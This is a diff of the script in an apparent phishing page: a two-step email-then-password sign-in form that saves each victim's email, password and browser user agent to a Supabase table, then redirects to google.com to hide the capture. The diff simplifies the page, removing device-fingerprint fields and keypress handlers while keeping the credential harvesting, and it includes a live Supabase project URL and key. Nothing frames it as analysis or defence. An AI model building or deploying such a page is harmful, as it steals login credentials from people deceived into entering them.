@@ -155,48 +155,40 @@
     <script>
         // REPLACE WITH YOUR SUPABASE CREDENTIALS
         const SUPABASE_URL = 'https://aqynejlgjwdmxsekuyld.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
         
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+        
         let step = 1;
-        let email = '';
-
+        
         function handleSubmit() {
-            const emailInput = document.getElementById('email');
-            const passwordInput = document.getElementById('password');
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password');
             
             if (step === 1) {
-                email = emailInput.value.trim();
                 if (!email) {
-                    alert('Please enter your email');
+                    alert('Enter email');
                     return;
                 }
-                document.getElementById('passwordGroup').style.display = 'block';
-                document.getElementById('btnText').textContent = 'Sign in';
+                password.style.display = 'block';
+                document.getElementById('submitBtn').textContent = 'Sign in';
                 step = 2;
-                setTimeout(() => passwordInput.focus(), 100);
             } else if (step === 2) {
-                const password = passwordInput.value;
-                if (!password) {
-                    alert('Please enter your password');
+                if (!password.value) {
+                    alert('Enter password');
                     return;
                 }
-                
-                document.getElementById('loading').style.display = 'block';
-                document.getElementById('btnText').style.display = 'none';
-                document.getElementById('submitBtn').disabled = true;
                 
                 // Save to Supabase
-                saveData(email, password);
+                saveData(email, password.value);
                 
-                // Redirect to Google
+                // Redirect
                 setTimeout(() => {
                     window.location.href = 'https://www.google.com';
-                }, 1500);
+                }, 1000);
             }
         }
-
+        
         async function saveData(email, password) {
             try {
                 const { data, error } = await supabase
@@ -206,33 +198,19 @@
                             email: email,
                             password: password,
                             user_agent: navigator.userAgent,
-                            referer: document.referrer || 'Direct',
-                            device_info: {
-                                language: navigator.language,
-                                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                                platform: navigator.platform
-                            }
+                            created_at: new Date()
                         }
                     ]);
-
+                
                 if (error) {
-                    console.error('Error saving:', error);
+                    console.error('Error:', error);
                 } else {
-                    console.log('✅ Data saved successfully');
+                    console.log('✅ Saved successfully');
                 }
-            } catch (error) {
-                console.error('Error:', error);
+            } catch (err) {
+                console.error('Error:', err);
             }
         }
-
-        document.getElementById('email').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') handleSubmit();
-        });
-        
-        document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') handleSubmit();
-        });
     </script>
 </body>
 </html>
